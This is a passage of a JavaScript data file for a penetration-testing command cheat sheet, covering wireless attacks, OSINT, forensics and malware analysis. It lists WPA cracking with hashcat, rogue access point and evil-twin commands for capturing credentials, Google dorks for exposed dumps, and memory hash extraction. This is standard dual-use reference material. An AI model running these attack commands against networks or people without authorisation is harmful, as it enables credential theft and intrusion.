        cmd: "hcxpcapngtool -o hash.hc22000 capture.pcapng",
        desc: "Convert captured traffic to hashcat-compatible format",
      },
      {
        cmd: "hashcat -m 22000 hash.hc22000 rockyou.txt",
        desc: "Crack WPA/WPA2 using PMKID/EAPOL with hashcat",
      },
      {
        cmd: "hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf",
        desc: "Set up a rogue access point for credential capture",
      },
      {
        cmd: "eaphammer --bssid <bssid> --essid <ssid> --channel 6 --auth wpa-eap --creds --interface wlan0",
        desc: "Evil twin attack for WPA-Enterprise credential capture",
      },
      {
        cmd: "iwconfig wlan0",
        desc: "Display wireless interface configuration and mode",
      },
      {
        cmd: "iw dev wlan0 scan | grep -E 'SSID|signal|BSS '",
        desc: "Quick wireless network scan with signal strength",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 28. OSINT Techniques  (25 items)
  // ---------------------------------------------------------------
  {
    cat: "Reconnaissance",
    title: "OSINT Techniques",
    items: [
      {
        cmd: "whois <domain>",
        desc: "Query WHOIS registration data for a domain",
        example: "whois example.com",
      },
      {
        cmd: "dig <domain> ANY",
        desc: "Query all DNS record types for a domain",
        example: "dig example.com ANY",
      },
      {
        cmd: "dig +short <domain> MX",
        desc: "Look up mail server records",
        example: "dig +short example.com MX",
      },
      {
        cmd: "dig +short <domain> TXT",
        desc: "Look up TXT records (SPF, DMARC, verification)",
        example: "dig +short example.com TXT",
      },
      {
        cmd: "dig +short <domain> NS",
        desc: "Look up authoritative nameservers",
        example: "dig +short example.com NS",
      },
      {
        cmd: "host -t AXFR <domain> <ns>",
        desc: "Attempt a DNS zone transfer",
        example: "host -t AXFR example.com ns1.example.com",
      },
      {
        cmd: "dnsrecon -d <domain> -t std",
        desc: "Standard DNS enumeration with dnsrecon",
        example: "dnsrecon -d example.com -t std",
      },
      {
        cmd: "theHarvester -d <domain> -b google,bing,linkedin",
        desc: "Gather emails, hosts, and names from search engines",
        example: "theHarvester -d example.com -b google,bing,linkedin",
      },
      {
        cmd: "shodan search 'hostname:<domain>'",
        desc: "Search Shodan for internet-facing assets of a domain",
      },
      {
        cmd: "shodan host <ip>",
        desc: "Get detailed Shodan data for a specific IP address",
        example: "shodan host 8.8.8.8",
      },
      {
        cmd: "censys search '<domain>'",
        desc: "Search Censys for certificates and hosts related to a domain",
      },
      {
        cmd: "subfinder -d <domain> -silent",
        desc: "Passive subdomain enumeration using multiple sources",
      },
      {
        cmd: "amass enum -passive -d <domain>",
        desc: "Passive-only subdomain discovery with Amass",
      },
      {
        cmd: "curl -s 'https://crt.sh/?q=%25.<domain>&output=json' | jq '.[].name_value' | sort -u",
        desc: "Search Certificate Transparency logs for subdomains",
      },
      {
        cmd: "curl -s 'https://web.archive.org/cdx/search/cdx?url=*.<domain>&output=text&fl=original' | sort -u",
        desc: "Query Wayback Machine for historical URLs",
      },
      {
        cmd: "waybackurls <domain>",
        desc: "Fetch all archived URLs from the Wayback Machine",
        example: "waybackurls example.com",
      },
      {
        cmd: "gau <domain>",
        desc: "Get all known URLs from multiple sources (AlienVault, Wayback, etc.)",
      },
      {
        cmd: "google: site:<domain> filetype:pdf",
        desc: "Google dork: find PDF files on the target domain",
      },
      {
        cmd: "google: site:<domain> inurl:admin",
        desc: "Google dork: find admin pages on the target",
      },
      {
        cmd: "google: site:<domain> intitle:\"index of\"",
        desc: "Google dork: find directory listings on the target",
      },
      {
        cmd: "google: \"<target>\" ext:sql | ext:bak | ext:log",
        desc: "Google dork: find database dumps, backups, and log files",
      },
      {
        cmd: "exiftool <image>",
        desc: "Extract metadata from images (GPS coords, camera model, author)",
        example: "exiftool photo.jpg",
      },
      {
        cmd: "metagoofil -d <domain> -t pdf,doc,xls -o output/",
        desc: "Download and extract metadata from public documents",
      },
      {
        cmd: "sherlock <username>",
        desc: "Search for a username across 300+ social networks",
        example: "sherlock johndoe",
      },
      {
        cmd: "holehe <email>",
        desc: "Check which sites an email is registered on",
        example: "holehe user@example.com",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 29. Forensics  (20 commands)
  // ---------------------------------------------------------------
  {
    cat: "Forensics",
    title: "Forensics",
    items: [
      {
        cmd: "volatility -f memory.dmp imageinfo",
        desc: "Identify the OS profile from a memory dump (Volatility 2)",
      },
      {
        cmd: "volatility -f memory.dmp --profile=<profile> pslist",
        desc: "List running processes from a memory dump",
      },
      {
        cmd: "volatility -f memory.dmp --profile=<profile> pstree",
        desc: "Display process tree from a memory dump",
      },
      {
        cmd: "volatility -f memory.dmp --profile=<profile> hashdump",
        desc: "Extract password hashes from a memory dump",
      },
      {
        cmd: "volatility -f memory.dmp --profile=<profile> cmdline",
        desc: "Show command-line arguments of all processes",
      },
      {
        cmd: "volatility -f memory.dmp --profile=<profile> filescan",
        desc: "Scan memory for file objects",
      },
      {
        cmd: "volatility -f memory.dmp --profile=<profile> netscan",
        desc: "List network connections from a memory dump",
      },
      {
        cmd: "vol3 -f memory.dmp windows.info",
        desc: "Volatility 3: get OS info from a Windows memory image",
      },
      {
        cmd: "vol3 -f memory.dmp windows.pslist",
        desc: "Volatility 3: list processes from a memory dump",
      },
      {
        cmd: "strings -a memory.dmp | grep -i 'password'",
        desc: "Search a memory dump for plaintext password strings",
      },
      {
        cmd: "binwalk <file>",
        desc: "Scan a file for embedded files and data",
        example: "binwalk firmware.bin",
      },
      {
        cmd: "binwalk -e <file>",
        desc: "Extract embedded files from a binary/firmware",
      },
      {
        cmd: "foremost -i disk.img -o output/",
        desc: "Carve files from a disk image based on headers/footers",
      },
      {
        cmd: "steghide extract -sf <image>",
        desc: "Extract hidden data from a JPEG/BMP using steghide",
        example: "steghide extract -sf stego.jpg",
      },
      {
        cmd: "zsteg <image>",
        desc: "Detect steganography in PNG/BMP files",
        example: "zsteg hidden.png",
      },
      {
        cmd: "exiftool <file>",
        desc: "Extract all metadata from a file (images, documents, etc.)",
      },
      {
        cmd: "file <file>",
        desc: "Identify file type based on magic bytes",
        example: "file unknown.bin",
      },
      {
        cmd: "xxd <file> | head -50",
        desc: "Hex dump the beginning of a file for manual analysis",
      },
      {
        cmd: "md5sum <file> && sha256sum <file>",
        desc: "Calculate MD5 and SHA-256 hashes of a file for integrity checks",
      },
      {
        cmd: "autopsy",
        desc: "Launch the Autopsy digital forensics GUI for disk analysis",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 30. Malware Analysis  (20 commands)
  // ---------------------------------------------------------------
  {
    cat: "Malware Analysis",
    title: "Malware Analysis",
    items: [
      {
        cmd: "file <sample>",
        desc: "Identify the file type of a malware sample",
        example: "file suspicious.exe",
      },
      {
        cmd: "md5sum <sample> && sha256sum <sample>",
        desc: "Hash the sample for VirusTotal lookup and tracking",
      },
      {
        cmd: "strings <sample> | less",
        desc: "Extract printable strings from a binary (look for IoCs)",
      },
      {
        cmd: "strings -el <sample>",
        desc: "Extract wide (UTF-16LE) strings from a Windows binary",
      },
      {
        cmd: "objdump -d <sample> | head -200",
        desc: "Disassemble the first portion of an ELF binary",
      },
      {
        cmd: "readelf -h <sample>",
        desc: "Display ELF header information (architecture, entry point)",
      },
      {
        cmd: "readelf -S <sample>",
        desc: "List ELF section headers (identify packed/unusual sections)",
      },
      {
        cmd: "upx -d <sample> -o unpacked.bin",
        desc: "Unpack a UPX-compressed binary for analysis",
      },
      {
        cmd: "strace -o trace.log ./<sample>",
        desc: "Trace system calls made by the sample during execution",
      },
      {
        cmd: "ltrace -o trace.log ./<sample>",
        desc: "Trace library calls made by the sample during execution",
      },
      {
        cmd: "rabin2 -I <sample>",
        desc: "Display binary info using radare2 (arch, OS, format)",
      },
      {
        cmd: "r2 -A <sample>",
        desc: "Open a binary in radare2 with automatic analysis",
      },
      {
        cmd: "ghidra &",
        desc: "Launch Ghidra GUI for decompilation and reverse engineering",
      },
      {
        cmd: "cutter <sample>",
        desc: "Open a binary in Cutter (radare2 GUI) for analysis",
      },
      {
        cmd: "yara -r rules.yar <sample>",
        desc: "Scan a sample against YARA rules for malware classification",
      },
      {
        cmd: "yara -r rules.yar /path/to/directory/",
        desc: "Scan an entire directory recursively with YARA rules",
      },
      {
        cmd: "olevba <document>",
        desc: "Extract and analyze VBA macros from Office documents",
        example: "olevba suspicious.docm",
      },
      {
        cmd: "pdfparser.py <pdf>",
        desc: "Parse a PDF file structure for malicious objects",
        example: "pdfparser.py suspicious.pdf",
      },
      {
        cmd: "peframe <sample>",
        desc: "Static analysis of a PE file (imports, sections, packer detection)",
      },
      {
        cmd: "capa <sample>",
        desc: "Identify capabilities of a binary using CAPA rules",
        example: "capa malware.exe",
      },
    ],
  },

];
